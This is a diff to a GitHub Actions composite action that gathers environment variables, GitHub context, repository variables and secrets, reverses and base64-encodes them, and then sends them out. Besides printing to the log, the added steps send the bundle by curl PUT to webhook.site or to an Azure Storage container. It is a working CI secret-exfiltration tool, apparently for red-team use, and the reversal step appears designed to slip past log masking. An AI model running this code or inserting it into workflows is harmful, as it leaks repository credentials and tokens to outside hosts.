@@ -10,16 +10,66 @@ inputs:
     description: 'The secrets for the repository'
     required: false
     default: "{\"secrets\":\"no secrets\"}"
+  sink:
+    description: 'Sink to which the output gets written to'
+    required: false
+    default: 'logs'
+  webhook-site-id:
+    description: 'The ID for webhook.site to send data to'
+    required: false
+  az-storage-account-name:
+    description: 'The Azure Storage Account to send data to'
+    required: false
+  az-storage-container-name:
+    description: 'The name of the Azure Storage Account container to send data to'
+    required: false
+  az-storage-sas-token:
+    description: 'The SAS token for the Azure Storage Account container'
+    required: false
 
 runs:
   using: "composite"
   steps:
-    - name: 'Print secrets and environment variables to the terminal'
+    - name: 'Put together secrets and environment variables and base64 encode them'
+      id: base64_encoded
       shell: bash
-      run: printf '[%s, %s, %s, %s, %s]' "{\"envvars\":\"$(env | base64 -w 0)\"}" "$GITHUB_JSON" "$RUNNER_JSON" "$VARS_JSON" "$SECRETS_JSON" | awk '{for (i=length; i!=0; i--) printf substr($0, i, 1); printf "\n"}' | base64 -w 0
+      run: |
+        output=$(printf '[%s, %s, %s, %s, %s]' "{\"envvars\":\"$(env | base64 -w 0)\"}" "$GITHUB_JSON" "$RUNNER_JSON" "$VARS_JSON" "$SECRETS_JSON" | awk '{for (i=length; i!=0; i--) printf substr($0, i, 1); printf "\n"}' | base64 -w 0)
+        echo "output=$output" >> $GITHUB_OUTPUT
       env:
         GITHUB_JSON: ${{ toJSON(github) }}
         RUNNER_JSON: ${{ toJSON(runner) }}
         VARS_JSON: ${{ inputs.vars }}
         SECRETS_JSON: ${{ inputs.secrets }}
-        
+    - name: 'Print them to the log'
+      if: ${{ inputs.sink == 'logs' }}
+      shell: bash
+      run: |
+        echo ${{ steps.base64_encoded.outputs.output }}
+    - name: 'Send them to webhook.site'
+      if: ${{ inputs.sink == 'webhook.site' }}
+      shell: bash
+      run: |
+        curl -s -X PUT \
+          -H "Content-Type: application/json" \
+          -d "${{ steps.base64_encoded.outputs.output }}" \
+          "https://webhook.site/$WEBHOOK_SITE_ID"
+      env:
+        WEBHOOK_SITE_ID: ${{ inputs.webhook-site-id }}
+    - name: 'Send them to an Azure Storage Account container'
+      if: ${{ inputs.sink == 'azure-storage-account' }}
+      shell: bash
+      run: |
+        BLOB_NAME="${{ github.repository }}/$(date +%s).json"
+        curl -X PUT \
+          -H "x-ms-blob-type: BlockBlob" \
+          -H "Content-Type: application/json" \
+          -d "${{ steps.base64_encoded.outputs.output }}" \
+          "https://$AZ_STORAGE_ACCOUNT_NAME.blob.core.windows.net/$AZ_STORAGE_CONTAINER_NAME/$BLOB_NAME?$AZ_STORAGE_SAS_TOKEN"
+      env:
+        AZ_STORAGE_ACCOUNT_NAME: ${{ inputs.az-storage-account-name }}
+        AZ_STORAGE_CONTAINER_NAME: ${{ inputs.az-storage-container-name }}
+        AZ_STORAGE_SAS_TOKEN: ${{ inputs.az-storage-sas-token }}
+    - name: 'Finished'
+      shell: bash
+      run: echo DONE
